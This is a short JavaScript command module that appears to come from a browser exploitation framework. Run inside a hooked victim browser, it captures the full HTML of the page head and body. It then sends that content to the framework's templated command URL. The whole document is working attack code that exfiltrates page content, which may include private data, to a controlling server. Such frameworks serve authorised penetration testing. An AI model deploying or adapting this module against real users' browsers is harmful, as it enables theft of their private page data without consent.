//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	var head = server.browser.getPageHead();
	var body = server.browser.getPageBody();
	var mod_data = 'head=' + head + '&body=' + body;
	server.net.send("<%= @command_url %>", <%= @command_id %>, mod_data, server.are.status_success());
	return [server.are.status_success(), mod_data];
});

